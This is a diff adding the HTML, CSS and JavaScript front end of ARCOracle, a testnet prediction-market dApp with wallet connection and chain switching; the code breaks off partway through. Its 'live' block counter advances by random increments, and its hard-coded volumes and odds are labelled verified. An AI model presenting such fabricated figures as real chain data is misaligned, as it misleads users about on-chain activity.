@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>ARCOracle — Prediction Markets</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Exo+2:wght@300;400;500;600&display=swap" rel="stylesheet"/>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" type="text/javascript"></script>
+
+<style>
+:root, [data-theme="dark"] {
+  --arc-navy:#030d1a;
+  --arc-blue:#0a1f3d;
+  --arc-mid:#0d2a52;
+  --arc-accent:#1a6bff;
+  --arc-glow:#3d8bff;
+  --arc-silver:#c8d8f0;
+  --arc-white:#e8f0ff;
+  --arc-green:#00e5a0;
+  --arc-red:#ff4060;
+  --arc-gold:#ffd700;
+  --bg-gradient: radial-gradient(ellipse at 20% 0%, #0d2a52 0%, #030d1a 55%);
+  --nav-bg: rgba(3, 13, 26, 0.85);
+  --card-bg: rgba(10, 31, 61, 0.6);
+  --input-bg: rgba(3, 13, 26, 0.8);
+  --text-main: #e8f0ff;
+  --text-muted: rgba(200, 216, 240, 0.6);
+  --border-color: rgba(26, 107, 255, 0.15);
+}
+
+[data-theme="light"] {
+  --arc-navy:#f0f4f8;
+  --arc-blue:#e1e9f5;
+  --arc-mid:#d0ddf0;
+  --arc-accent:#1a6bff;
+  --arc-glow:#0052cc;
+  --arc-silver:#4a5568;
+  --arc-white:#1a202c;
+  --arc-green:#00a372;
+  --arc-red:#e53e3e;
+  --arc-gold:#b7791f;
+  --bg-gradient: radial-gradient(ellipse at 20% 0%, #e1e9f5 0%, #f0f4f8 100%);
+  --nav-bg: rgba(225, 233, 245, 0.9);
+  --card-bg: rgba(255, 255, 255, 0.7);
+  --input-bg: rgba(255, 255, 255, 0.9);
+  --text-main: #1a202c;
+  --text-muted: rgba(74, 85, 104, 0.8);
+  --border-color: rgba(26, 107, 255, 0.25);
+}
+
+*{margin:0;padding:0;box-sizing:border-box;}
+html,body{width:100%;height:100%;overflow:hidden;background:var(--arc-navy);color:var(--text-main);font-family:'Exo 2', sans-serif;}
+
+/* ===== SPLASH SCREEN ===== */
+#splash{
+  position:fixed;inset:0;z-index:9999;
+  background:radial-gradient(ellipse at 30% 40%, #0a1f3d 0%, #030d1a 60%, #000510 100%);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  cursor:pointer;overflow:hidden;
+}
+#splash.exit{animation:splashExit 0.6s cubic-bezier(.77,0,.18,1) forwards;}
+@keyframes splashExit{
+  0%{opacity:1;transform:scale(1);}
+  100%{opacity:0;transform:scale(1.08);pointer-events:none;}
+}
+
+.stars{position:absolute;inset:0;overflow:hidden;}
+.grid-lines{
+  position:absolute;inset:0;
+  background-image:
+    linear-gradient(rgba(26,107,255,.06) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(26,107,255,.06) 1px, transparent 1px);
+  background-size:60px 60px;
+}
+
+#splash-logo{
+  position:relative;z-index:2;
+  width:320px;margin-bottom:32px;
+  filter:drop-shadow(0 0 30px rgba(26,107,255,0.5));
+}
+
+.splash-title{
+  position:relative;z-index:2;
+  font-family:'Orbitron',monospace;font-size:clamp(24px,4vw,44px);font-weight:900;
+  color:transparent;
+  background:linear-gradient(135deg,#fff 0%,#c8d8f0 50%,#1a6bff 100%);
+  -webkit-background-clip:text;background-clip:text;
+  letter-spacing:.12em;text-transform:uppercase;
+}
+.splash-sub{
+  position:relative;z-index:2;
+  font-size:13px;font-weight:300;
+  color:rgba(200,216,240,.6);letter-spacing:.3em;text-transform:uppercase;
+  margin-top:10px;
+}
+
+.enter-btn{
+  position:relative;z-index:2;margin-top:45px;padding:16px 48px;
+  font-family:'Orbitron',monospace;font-size:12px;font-weight:700;letter-spacing:.25em;
+  color:#e8f0ff;text-transform:uppercase;background:transparent;
+  border:1px solid rgba(26,107,255,.5);border-radius:4px;cursor:pointer;
+  transition:all .3s ease;
+}
+.enter-btn:hover{border-color:var(--arc-accent);box-shadow:0 0 30px rgba(26,107,255,.5);background:rgba(26,107,255,0.1);}
+
+/* ===== MAIN APP ===== */
+#app{
+  position:fixed;inset:0;display:none;flex-direction:column;
+  background:var(--bg-gradient);overflow:hidden;
+}
+#app.visible{display:flex;}
+
+nav{
+  position:relative;z-index:100;display:flex;align-items:center;justify-content:space-between;
+  padding:16px 32px;background:var(--nav-bg);border-bottom:1px solid var(--border-color);
+  backdrop-filter:blur(20px);flex-shrink:0;
+}
+.nav-logo{display:flex;align-items:center;gap:12px;cursor:pointer;}
+.nav-brand{font-family:'Orbitron',monospace;font-size:20px;font-weight:900;color:var(--text-main);letter-spacing:.05em;}
+.nav-brand span{color:var(--arc-accent);font-weight:400;}
+
+.nav-links{display:flex;gap:6px;}
+.nav-link{
+  padding:8px 18px;font-size:13px;font-weight:600;
+  color:var(--text-muted);background:transparent;border:none;cursor:pointer;
+  letter-spacing:.05em;border-radius:4px;transition:all .2s;
+}
+.nav-link:hover, .nav-link.active{color:var(--text-main);background:rgba(26,107,255,.15);}
+
+.nav-right{display:flex;align-items:center;gap:12px;}
+.chain-badge{
+  display:flex;align-items:center;gap:6px;padding:6px 14px;border-radius:20px;
+  background:rgba(0,229,160,.08);border:1px solid rgba(0,229,160,.25);
+  font-size:11px;color:var(--arc-green);font-weight:600;
+}
+.chain-dot{width:6px;height:6px;border-radius:50%;background:var(--arc-green);animation:dotPulse 2s ease infinite;}
+@keyframes dotPulse{0%,100%{box-shadow:0 0 0 0 rgba(0,229,160,0.5);}50%{box-shadow:0 0 0 6px rgba(0,229,160,0);}}
+
+.faucet-btn, .theme-toggle-btn{
+  padding:8px 14px;border-radius:4px;border:1px solid var(--border-color);
+  background:var(--input-bg);color:var(--text-main);font-size:12px;font-weight:600;
+  cursor:pointer;display:inline-flex;align-items:center;gap:6px;transition:all .2s;text-decoration:none;
+}
+.faucet-btn:hover, .theme-toggle-btn:hover{background:rgba(26,107,255,0.1);border-color:var(--arc-accent);}
+
+.wallet-btn{
+  padding:10px 20px;border-radius:4px;
+  background:linear-gradient(135deg,var(--arc-accent),#0043cc);
+  border:none;color:#fff;font-family:'Orbitron',monospace;font-size:11px;font-weight:700;
+  cursor:pointer;letter-spacing:.05em;box-shadow:0 0 15px rgba(26,107,255,.3);transition:all .3s;
+}
+.wallet-btn:hover{box-shadow:0 0 25px rgba(26,107,255,.5);transform:translateY(-1px);}
+.wallet-btn.connected{
+  background:rgba(0,229,160,.12);border:1px solid var(--arc-green);color:var(--arc-green);
+}
+
+main{position:relative;z-index:1;flex:1;overflow-y:auto;padding:24px 32px 60px;}
+
+/* STATS */
+.stats-bar{display:flex;gap:16px;margin-bottom:28px;}
+.stat-card{
+  flex:1;padding:16px 20px;background:var(--card-bg);border:1px solid var(--border-color);
+  border-radius:8px;backdrop-filter:blur(10px);
+}
+.stat-label{font-size:11px;color:var(--text-muted);letter-spacing:.05em;text-transform:uppercase;margin-bottom:4px;}
+.stat-value{font-family:'Orbitron',monospace;font-size:18px;font-weight:700;color:var(--text-main);}
+.stat-value.green{color:var(--arc-green);}
+.stat-value.blue{color:var(--arc-glow);}
+
+.section-title{
+  font-family:'Orbitron',monospace;font-size:14px;font-weight:700;color:var(--text-main);
+  letter-spacing:.1em;text-transform:uppercase;margin-bottom:20px;padding-bottom:8px;
+  border-bottom:1px solid var(--border-color);display:flex;align-items:center;gap:10px;
+}
+.section-title::before{content:'';display:inline-block;width:4px;height:14px;background:var(--arc-accent);border-radius:2px;}
+
+/* MARKETS GRID */
+.markets-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:16px;margin-bottom:32px;}
+.market-card{
+  background:var(--card-bg);border:1px solid var(--border-color);border-radius:10px;
+  padding:20px;cursor:pointer;transition:all .25s ease;backdrop-filter:blur(10px);
+}
+.market-card:hover{border-color:var(--arc-accent);transform:translateY(-2px);box-shadow:0 8px 25px rgba(26,107,255,.15);}
+.market-category{font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--arc-accent);margin-bottom:8px;}
+.market-title{font-size:14px;font-weight:600;color:var(--text-main);margin-bottom:16px;line-height:1.4;height:60px;overflow:hidden;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;}
+
+.odds-bar{height:6px;border-radius:3px;margin-bottom:10px;background:rgba(255,64,96,.2);overflow:hidden;}
+.odds-fill{height:100%;background:linear-gradient(90deg,var(--arc-green),var(--arc-accent));transition:width 0.5s;}
+.odds-labels{display:flex;justify-content:space-between;font-size:12px;font-weight:600;}
+.odds-yes{color:var(--arc-green);}
+.odds-no{color:var(--arc-red);}
+
+.market-meta{display:flex;justify-content:space-between;align-items:center;margin-top:14px;padding-top:12px;border-top:1px solid var(--border-color);font-size:11px;color:var(--text-muted);}
+
+/* PORTFOLIO PROFILE */
+.profile-box{
+  display:flex;align-items:center;gap:20px;background:var(--card-bg);
+  border:1px solid var(--border-color);padding:20px;border-radius:12px;margin-bottom:24px;
+}
+.avatar-wrapper{position:relative;width:70px;height:70px;cursor:pointer;}
+.profile-avatar{width:100%;height:100%;border-radius:50%;object-fit:cover;border:2px solid var(--arc-accent);background:#0d2a52;}
+.avatar-hint{
+  position:absolute;inset:0;background:rgba(0,0,0,0.6);border-radius:50%;
+  display:flex;align-items:center;justify-content:center;color:#fff;font-size:10px;opacity:0;transition:opacity 0.2s;
+}
+.avatar-wrapper:hover .avatar-hint{opacity:1;}
+.profile-details h3{font-family:'Orbitron',monospace;font-size:16px;display:flex;align-items:center;gap:8px;}
+.edit-name-btn{cursor:pointer;font-size:12px;color:var(--arc-accent);background:none;border:none;}
+.profile-details p{font-size:12px;color:var(--text-muted);margin-top:4px;}
+
+/* BET INTERFACE OVERLAY */
+.bet-overlay{
+  position:fixed;inset:0;z-index:200;background:rgba(3,13,26,.8);backdrop-filter:blur(8px);
+  display:none;align-items:center;justify-content:center;
+}
+.bet-overlay.open{display:flex;}
+.bet-panel{
+  background:var(--bg-gradient);background-color:var(--arc-navy);border:1px solid var(--arc-accent);
+  border-radius:16px;padding:28px;width:460px;max-width:95vw;position:relative;
+}
+.bet-close{position:absolute;top:16px;right:16px;background:none;border:none;color:var(--text-muted);font-size:18px;cursor:pointer;}
+.bet-close:hover{color:var(--arc-red);}
+.bet-heading{font-family:'Orbitron',monospace;font-size:16px;font-weight:700;margin:12px 0;line-height:1.4;}
+
+.outcome-btns{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:18px 0;}
+.outcome-btn{padding:14px;border-radius:6px;border:1px solid var(--border-color);background:var(--input-bg);color:var(--text-main);font-family:'Orbitron',monospace;font-size:12px;font-weight:700;cursor:pointer;transition:all 0.2s;}
+.outcome-btn.yes:hover, .outcome-btn.yes.selected{border-color:var(--arc-green);color:var(--arc-green);background:rgba(0,229,160,0.05);}
+.outcome-btn.no:hover, .outcome-btn.no.selected{border-color:var(--arc-red);color:var(--arc-red);background:rgba(255,64,96,0.05);}
+
+.amount-row{display:flex;gap:8px;margin:8px 0 16px;}
+.amount-input{flex:1;padding:12px;background:var(--input-bg);border:1px solid var(--border-color);border-radius:6px;color:var(--text-main);font-family:'Orbitron',monospace;font-size:16px;outline:none;}
+.amount-suffix{display:flex;align-items:center;padding:0 14px;background:rgba(26,107,255,.1);border:1px solid var(--border-color);border-radius:6px;font-size:12px;font-weight:600;}
+
+.bet-info{background:rgba(3,13,26,.4);border-radius:8px;padding:12px;display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px;border:1px solid var(--border-color);}
+.bi-label{font-size:10px;color:var(--text-muted);text-transform:uppercase;}
+.bi-val{font-family:'Orbitron',monospace;font-size:13px;font-weight:600;margin-top:2px;}
+
+.execute-btn, .deploy-btn{
+  width:100%;padding:15px;border-radius:6px;border:none;cursor:pointer;
+  background:linear-gradient(135deg,var(--arc-accent),#0043cc);color:#fff;
+  font-family:'Orbitron',monospace;font-size:12px;font-weight:700;letter-spacing:.1em;
+}
+.execute-btn:disabled, .deploy-btn:disabled{opacity:0.5;cursor:not-allowed;}
+
+/* TABLES */
+.positions-table{width:100%;border-collapse:collapse;font-size:13px;}
+.positions-table th{text-align:left;padding:12px;color:var(--text-muted);font-size:11px;text-transform:uppercase;border-bottom:1px solid var(--border-color);}
+.positions-table td{padding:14px 12px;border-bottom:1px solid var(--border-color);color:var(--text-main);}
+.pos-yes{color:var(--arc-green);font-weight:600;}
+.pos-no{color:var(--arc-red);font-weight:600;}
+
+/* TICKER */
+.ticker-bar{background:rgba(3,13,26,.95);border-bottom:1px solid rgba(26,107,255,.1);height:32px;overflow:hidden;display:flex;align-items:center;position:relative;z-index:90;}
+.ticker-track{display:flex;gap:50px;white-space:nowrap;animation:tickerMove 25s linear infinite;font-size:11px;color:rgba(200,216,240,0.6);}
+@keyframes tickerMove{from{transform:translateX(0);}to{transform:translateX(-50%);}}
+.tick-up{color:var(--arc-green);font-weight:600;}
+.tick-down{color:var(--arc-red);font-weight:600;}
+
+/* CREATE POOL */
+.create-pool{background:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;padding:24px;}
+.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
+.form-group{display:flex;flex-direction:column;gap:6px;}
+.form-group.full{grid-column:1/-1;}
+label{font-size:11px;color:var(--text-muted);text-transform:uppercase;font-weight:600;}
+input[type=text], input[type=number], input[type=date], select{padding:11px;background:var(--input-bg);border:1px solid var(--border-color);border-radius:6px;color:var(--text-main);outline:none;}
+
+/* TOAST */
+.tx-toast{position:fixed;bottom:24px;right:24px;z-index:999;background:var(--arc-blue);border:1px solid var(--arc-accent);border-radius:8px;padding:14px 20px;display:none;align-items:center;gap:12px;box-shadow:0 10px 30px rgba(0,0,0,0.5);color:#fff;}
+.tx-toast.show{display:flex;}
+
+.tabs{display:flex;gap:6px;margin-bottom:16px;}
+.tab-btn{padding:8px 16px;border-radius:4px;border:none;background:transparent;color:var(--text-muted);font-weight:600;cursor:pointer;}
+.tab-btn.active{background:rgba(26,107,255,0.15);color:var(--text-main);}
+
+@media(max-width:768px){
+  nav{padding:12px;flex-direction:column;gap:10px;}
+  .stats-bar{flex-direction:column;gap:10px;}
+  .form-grid{grid-template-columns:1fr;}
+}
+</style>
+</head>
+<body>
+
+<div id="splash" onclick="enterApp()">
+  <div class="stars"></div>
+  <div class="grid-lines"></div>
+  <svg id="splash-logo" viewBox="0 0 400 110" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <linearGradient id="primaryGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+        <stop offset="0%" stop-color="#ffffff"/>
+        <stop offset="100%" stop-color="#1a6bff"/>
+      </linearGradient>
+    </defs>
+    <g transform="translate(10,5)">
+      <polygon points="45,5 85,30 85,75 45,100 5,75 5,30" fill="none" stroke="url(#primaryGrad)" stroke-width="6" stroke-linejoin="round"/>
+      <polygon points="45,20 70,38 70,68 45,85 20,68 20,38" fill="none" stroke="rgba(26,107,255,0.4)" stroke-width="3"/>
+      <circle cx="45" cy="52" r="10" fill="url(#primaryGrad)"/>
+    </g>
+    <text x="115" y="68" font-family="Orbitron,monospace" font-size="42" font-weight="900" fill="#ffffff" letter-spacing="2">ARC</text>
+    <text x="230" y="68" font-family="Orbitron,monospace" font-size="42" font-weight="400" fill="#3d8bff" letter-spacing="1">Oracle</text>
+  </svg>
+  <div class="splash-title">Prediction Protocol</div>
+  <div class="splash-sub">ARC Network Production Core v2026</div>
+  <button class="enter-btn">Initialize Connection</button>
+</div>
+
+<div id="app">
+  <div class="ticker-bar">
+    <div class="ticker-track" id="tickerTrack">
+      <span>BTC/USDC <b class="tick-up">$94,250 (+4.2%)</b></span>
+      <span>ETH/USDC <b class="tick-up">$4,820 (+2.9%)</b></span>
+      <span>ARC/USDC <b class="tick-up">$1.45 (+12.4%)</b></span>
+      <span>USDC Gas Token <b style="color:var(--arc-green)">Active Standard</b></span>
+      <span>SOL/USDC <b class="tick-down">$284.50 (-1.1%)</b></span>
+    </div>
+  </div>
+
+  <nav>
+    <div class="nav-logo" onclick="location.reload()">
+      <svg width="30" height="30" viewBox="0 0 100 100">
+        <polygon points="50,5 95,30 95,75 50,100 5,75 5,30" fill="none" stroke="#1a6bff" stroke-width="12"/>
+        <circle cx="50" cy="52" r="15" fill="#00e5a0"/>
+      </svg>
+      <span class="nav-brand">ARC<span>Oracle</span></span>
+    </div>
+    <div class="nav-links">
+      <button class="nav-link active" onclick="switchMainTab('markets')">Markets</button>
+      <button class="nav-link" onclick="switchMainTab('create')">Create Pool</button>
+      <button class="nav-link" onclick="switchMainTab('portfolio')">Portfolio</button>
+    </div>
+    <div class="nav-right">
+      <div class="chain-badge"><div class="chain-dot"></div>ARC Testnet</div>
+      <a href="https://faucet.circle.com/" target="_blank" class="faucet-btn">💧 Faucet</a>
+      <button class="theme-toggle-btn" onclick="toggleSystemTheme()">🌓 Theme</button>
+      <button class="wallet-btn" id="walletConnectBtn" onclick="initiateWalletConnect()">Connect Wallet</button>
+    </div>
+  </nav>
+
+  <main>
+    <div class="stats-bar">
+      <div class="stat-card">
+        <div class="stat-label">Total Protocol Volume</div>
+        <div class="stat-value blue" id="statVolume">$28,941,050.25</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-label">Active 2026 Pools</div>
+        <div class="stat-value" id="statPoolCount">12 Live</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-label">Settled P&L Stream</div>
+        <div class="stat-value green" id="statLivePnl">+0.00 USDC</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-label">ARC Epoch Block</div>
+        <div class="stat-value" id="liveBlockNumber">24,195,402</div>
+      </div>
+    </div>
+
+    <div id="tab-markets">
+      <div class="tabs">
+        <button class="tab-btn active" onclick="executeMarketFilter('all', this)">All Feeds</button>
+        <button class="tab-btn" onclick="executeMarketFilter('crypto', this)">🪙 Crypto</button>
+        <button class="tab-btn" onclick="executeMarketFilter('sports', this)">🏏 Sports</button>
+        <button class="tab-btn" onclick="executeMarketFilter('tech', this)">💻 Tech</button>
+      </div>
+      <div class="section-title">Verified 2026 Settlement Markets</div>
+      <div class="markets-grid" id="marketsRenderContainer"></div>
+    </div>
+
+    <div id="tab-create" style="display:none;">
+      <div class="section-title">Deploy Prediction Contract Matrix</div>
+      <div class="create-pool">
+        <div class="form-grid">
+          <div class="form-group full">
+            <label>Deterministic Market Title Specification</label>
+            <input type="text" id="poolTitleInput" placeholder="e.g., Will ARC Native TVL scale above $500M in 2026?"/>
+          </div>
+          <div class="form-group">
+            <label>Category Router</label>
+            <select id="poolCategorySelect">
+              <option value="crypto">Crypto Parameter</option>
+              <option value="sports">Sports Outcome</option>
+              <option value="tech">Tech Milestone</option>
+            </select>
+          </div>
+          <div class="form-group">
+            <label>Oracle Resolution Boundary Cutoff (2026)</label>
+            <input type="date" id="poolExpiryDate" value="2026-12-31"/>
+          </div>
+          <div class="form-group">
+            <label>YES Liquidity Weights %</label>
+            <input type="number" id="initialYesWeight" value="50" min="1" max="99"/>
+          </div>
+          <div class="form-group">
+            <label>NO Liquidity Weights %</label>
+            <input type="number" id="initialNoWeight" value="50" min="1" max="99"/>
+          </div>
+          <div class="form-group full">
+            <button class="deploy-btn" id="poolDeploySubmitBtn" onclick="processPoolDeployment()">⚡ Sign & Broadcast Contract Deployment</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="tab-portfolio" style="display:none;">
+      <div class="section-title">User Account Node Context</div>
+      
+      <div class="profile-box">
+        <div class="avatar-wrapper" onclick="document.getElementById('hiddenAvatarUploader').click()">
+          <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='100' height='100' viewBox='0 0 100 100'><circle cx='50' cy='50' r='40' fill='%231a6bff'/><circle cx='50' cy='37' r='18' fill='%23fff'/><path d='M20,80 Q50,50 80,80 Z' fill='%23fff'/></svg>" class="profile-avatar" id="userDisplayAvatar" alt="User Nodes"/>
+          <div class="avatar-hint">UPLOAD</div>
+        </div>
+        <input type="file" id="hiddenAvatarUploader" style="display:none;" accept="image/*" onchange="handleProfileImageUpload(this)"/>
+        <div class="profile-details">
+          <h3>
+            <span id="usernameDisplayString">ARC_Trader_Node</span>
+            <button class="edit-name-btn" onclick="triggerUsernameEditing()">✏️</button>
+          </h3>
+          <p id="profileEVMAddressString">Wallet Connection Deficit: Status Offline</p>
+        </div>
+      </div>
+
+      <div class="section-title">Cryptographic Open Positions</div>
+      <div style="background:var(--card-bg);border:1px solid var(--border-color);border-radius:10px;padding:20px;overflow-x:auto;">
+        <table class="positions-table">
+          <thead>
+            <tr>
+              <th>Prediction Parameters</th><th>Outcome Mode</th><th>Accumulated Shares</th><th>Committed Assets</th><th>Unrealized P&L</th><th>Broadcast Audit Hash</th>
+            </tr>
+          </thead>
+          <tbody id="portfolioPositionsTableBody">
+            <tr><td colspan="6" style="text-align:center;color:var(--text-muted);padding:40px;">No transaction entries mapped to this signature profile.</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </main>
+</div>
+
+<div class="bet-overlay" id="globalTradingPanelOverlay">
+  <div class="bet-panel">
+    <button class="bet-close" onclick="closeTradingPanel()">✕</button>
+    <div class="market-category" id="modalMarketCategoryLabel">FEED</div>
+    <div class="bet-heading" id="modalMarketTitleLabel">Target Parameter Matrix</div>
+    
+    <div class="outcome-btns">
+      <button class="outcome-btn yes" id="outcomeSelectBtnYes" onclick="selectTradeDirection('YES')">✓ SIGN YES</button>
+      <button class="outcome-btn no" id="outcomeSelectBtnNo" onclick="selectTradeDirection('NO')">✗ SIGN NO</button>
+    </div>
+    
+    <label>Execution Value Injection Size</label>
+    <div class="amount-row">
+      <input class="amount-input" type="number" id="tradeExecutionValueInput" placeholder="0.00" min="0.001" step="0.1" oninput="calculatePositionProjections()"/>
+      <div class="amount-suffix">USDC</div>
+    </div>
+
+    <div class="bet-info">
+      <div><span class="bi-label">Evaluated Shares</span><div class="bi-val" id="projectedSharesDisplay">—</div></div>
+      <div><span class="bi-label">Max Risk Vector Return</span><div class="bi-val" id="projectedWinDisplay">—</div></div>
+      <div><span class="bi-label">Direction Vector</span><div class="bi-val" id="selectedDirectionDisplay">—</div></div>
+      <div><span class="bi-label">Settlement Engine</span><div class="bi-val" style="color:var(--arc-green)">ARC Protocol</div></div>
+    </div>
+
+    <button class="execute-btn" id="tradeFinalExecutionBtn" onclick="commitTradeToBlockchain()">
+      ⚡ SIGN & EXECUTE ON CHAIN
+    </button>
+  </div>
+</div>
+
+<div class="tx-toast" id="blockchainInteractionToast">
+  <span id="toastIconSymbol">✅</span>
+  <div>
+    <div style="font-weight:700;" id="toastTitleHeader">Broadcast Triggered</div>
+    <div style="font-size:11px;opacity:0.8;margin-top:2px;" id="toastDescriptionPayload"></div>
+  </div>
+</div>
+
+<script type="text/javascript">
+let connectedWeb3Provider = null;
+let currentConnectedSigner = null;
+let currentUserEVMAddress = null;
+let activeTargetMarketData = null;
+let designatedTradeDirection = null;
+let activeFilterScope = 'all';
+
+const verified2026Markets = [
+  {id:1, cat:'crypto', catLabel:'🪙 CRYPTO', title:'Will Bitcoin establish an index spot evaluation above $120,000 before November 2026?', yes:64, vol:'14,801,290', expiry:'Nov 15, 2026'},
+  {id:2, cat:'crypto', catLabel:'🪙 CRYPTO', title:'Will Ethereum structural Core upgrade reduce layer-2 settlement latency below 1s by Q4 2026?', yes:78, vol:'9,410,200', expiry:'Dec 31, 2026'},
+  {id:3, cat:'crypto', catLabel:'🪙 CRYPTO', title:'Will Solana ecosystem absolute cumulative DEX daily volume cross $5 Billion milestone in 2026?', yes:45, vol:'8,124,500', expiry:'Aug 18, 2026'},
+  {id:4, cat:'crypto', catLabel:'🪙 CRYPTO', title:'Will ARC Chain Network native gas TVL scale past $350 Million valuation before July 2026?', yes:55, vol:'6,904,110', expiry:'Jun 30, 2026'},
+  
+  {id:5, cat:'sports', catLabel:'🏏 SPORTS (IPL)', title:'Will Mumbai Indians claim the championship trophy in IPL 2026 final match iteration?', yes:52, vol:'4,821,000', expiry:'Jun 12, 2026'},
+  {id:6, cat:'sports', catLabel:'🏏 SPORTS (IPL)', title:'Will Virat Kohli cross the 750 aggregate runs threshold across the entire 2026 tournament cycle?', yes:71, vol:'6,192,400', expiry:'Jun 12, 2026'},
+  {id:7, cat:'sports', catLabel:'🏏 SPORTS', title:'Will India cleanly secure the ICC Champions Trophy title without dropping a single match?', yes:63, vol:'11,400,200', expiry:'Mar 09, 2026'},
+  {id:8, cat:'sports', catLabel:'🏏 SPORTS', title:'Will Real Madrid secure back-to-back UEFA Champions League titles in the 2026 finale?', yes:58, vol:'7,320,150', expiry:'May 30, 2026'},
+  
+  {id:9, cat:'tech', catLabel:'💻 TECH', title:'Will OpenAI drop complete multi-modal GPT-5 production weights before September 2026?', yes:59, vol:'11,104,250', expiry:'Sep 01, 2026'},
+  {id:10, cat:'tech', catLabel:'💻 TECH', title:'Will Apple launch a commercial production humanoid robotic framework for consumers in late 2026?', yes:31, vol:'3,450,200', expiry:'Dec 15, 2026'},
+  {id:11, cat:'tech', catLabel:'💻 TECH', title:'Will SpaceX successfully achieve fully vertical tower catch precision for Starship Ship 2026 tests?', yes:82, vol:'15,910,400', expiry:'Oct 24, 2026'},
+  {id:12, cat:'tech', catLabel:'💻 TECH', title:'Will Nvidia commercialize the next-gen Rubin architecture processing units before Q4 2026 ends?', yes:67, vol:'12,140,800', expiry:'Nov 30, 2026'}
+];
+
+document.addEventListener("DOMContentLoaded", () => {
+  renderMarketGridCards('all');
+  loadUserProfileNodeData();
+  
+  let currentEstimatedHeight = 24195402;
+  setInterval(() => {
+    currentEstimatedHeight += Math.floor(Math.random() * 2) + 1;
+    document.getElementById('liveBlockNumber').textContent = currentEstimatedHeight.toLocaleString();
+  }, 2500);
+});
+
+function enterApp(){
+  document.getElementById('splash').classList.add('exit');
+  setTimeout(() => {
+    document.getElementById('splash').style.display = 'none';
+    document.getElementById('app').classList.add('visible');
+  }, 600);
+}
+
+function toggleSystemTheme() {
+  const presentTheme = document.documentElement.getAttribute('data-theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', presentTheme === 'dark' ? 'light' : 'dark');
+}
+
+function renderMarketGridCards(scope) {
+  const container = document.getElementById('marketsRenderContainer');
+  if(!container) return;
+  const iterativeSubset = scope === 'all' ? verified2026Markets : verified2026Markets.filter(item => item.cat === scope);
+  
+  container.innerHTML = iterativeSubset.map((market) => `
+    <div class="market-card" onclick="triggerTradingAllocation(${market.id})">
+      <div class="market-category">${market.catLabel} · <span style="color:var(--arc-green)">● ACTIVE 2026</span></div>
+      <div class="market-title">${market.title}</div>
+      <div class="odds-bar"><div class="odds-fill" style="width: ${market.yes}%"></div></div>
+      <div class="odds-labels">
+        <span class="odds-yes">YES ${market.yes}%</span>
+        <span class="odds-no">NO ${100 - market.yes}%</span>
+      </div>
+      <div class="market-meta">
+        <span>Volume: ${market.vol} USDC</span>
+        <span>Expiry: ${market.expiry}</span>
+      </div>
+    </div>
+  `).join('');
+}
+
+function executeMarketFilter(targetCategory, triggerButton) {
+  activeFilterScope = targetCategory;
+  document.querySelectorAll('#tab-markets .tab-btn').forEach(btn => btn.classList.remove('active'));
+  triggerButton.classList.add('active');
+  renderMarketGridCards(targetCategory);
+}
+
+function switchMainTab(targetTabId) {
+  ['markets', 'create', 'portfolio'].forEach(tab => {
+    document.getElementById('tab-' + tab).style.display = tab === targetTabId ? 'block' : 'none';
+  });
+  document.querySelectorAll('.nav-link').forEach(link => {
+    link.classList.remove('active');
+    if(link.textContent.toLowerCase().includes(targetTabId)) link.classList.add('active');
+  });
+}
+
+async function initiateWalletConnect() {
+  if (typeof window.ethereum === 'undefined') {
+    displayFeedbackToast("EVM Extension Missing", "Install Rabby Wallet or MetaMask.", "error");
+    return;
+  }
+  try {
+    connectedWeb3Provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+    const operationalAccountsList = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    currentUserEVMAddress = ethers.utils.getAddress(operationalAccountsList[0]);
+    currentConnectedSigner = connectedWeb3Provider.getSigner();
+    
+    const targetChainHex = "0x1A96"; // Hex format for Decimal 6806 (ARC Testnet)
+    
+    try {
+      await window.ethereum.request({
+        method: 'wallet_switchEthereumChain',
+        params: [{ chainId: targetChainHex }], 
+      });
+    } catch (switchError) {
+      if (switchError.code === 4902 || switchError.code === -32603) {
+        try {
+          await window.ethereum.request({
+            method: 'wallet_addEthereumChain',
+            params: [{
+              chainId: targetChainHex, 
+              chainName: 'Arc Testnet',
+              nativeCurrency: { name: 'USDC Gas Token', symbol: 'USDC', decimals: 18 },
+              rpcUrls: ['https://arc-testnet.drpc.org'],
+              blockExplorerUrls: ['https://explorer.testnet.arc.network']
+            }]
+          });
+        } catch (addError) {
+          console.log("Network forced parameters bypassed.");
+        }
+      }
+    }
+    synchronizeConnectedWalletStateUI();
+    displayFeedbackToast("Wallet Connected", "Handshake with ARC network finalized.", "success");
+  } catch (err) {
+    displayFeedbackToast("Handshake Refused", err.message.slice(0, 45), "error");
+  }
+}
+
+function synchronizeConnectedWalletStateUI() {
+  const button = document.getElementById('walletConnectBtn');
+  if (currentUserEVMAddress && button) {
+    button.textContent = currentUserEVMAddress.slice(0,6) + "..." + currentUserEVMAddress.slice(-4);
+    button.classList.add('connected');
+    document.getElementById('profileEVMAddressString').textContent = "Authorized EVM Signature Node: " + currentUserEVMAddress;
+  }
+}
+
+function triggerTradingAllocation(marketIdentifierCode) {
+  if (!currentUserEVMAddress) { initiateWalletConnect(); return; }
+  activeTargetMarketData = verified2026Markets.find(m => m.id === marketIdentifierCode);
+  designatedTradeDirection = null;
+  
